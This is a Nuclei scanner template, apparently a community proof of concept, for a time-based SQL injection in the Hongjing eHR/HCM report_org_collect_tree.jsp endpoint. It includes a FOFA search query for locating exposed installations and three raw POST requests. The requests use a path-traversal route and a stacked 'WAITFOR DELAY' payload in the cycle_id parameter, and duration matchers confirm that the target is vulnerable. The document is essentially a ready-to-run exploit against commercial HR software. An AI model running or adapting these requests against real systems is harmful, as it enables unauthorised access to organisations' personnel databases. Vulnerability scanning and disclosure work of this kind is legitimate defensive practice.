# Add your nuclei formatted PoC!
id: hongjing-report_org_collect_tree-sqli
 
info:
  name: 宏景ehr-report_org_collect_tree-sql注入
  author: 蜜汁狗蛋
  severity: high
  metadata: 
    fofa-query:  app="HJSOFT-HCM" || body="宏景" || body="hj-hy-all-one-logo" || body="/general/sys/hjaxmanage.js" 
 
 
requests:
  - raw:
      - |
        POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0

        params=&isAction=2&cycle_id=6;WAITFOR DELAY '0:0:2' --
 
      - |
        POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0

        params=&isAction=2&cycle_id=6;WAITFOR DELAY '0:0:4' --
 
      - |
        POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0

        params=&isAction=2&cycle_id=6;WAITFOR DELAY '0:0:6' --
 
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=2  && duration_1<=4"
          - "duration_2>=4  && duration_2<=6"
          - "duration_3>=6  && duration_3<=8"
author: 蜜汁狗蛋
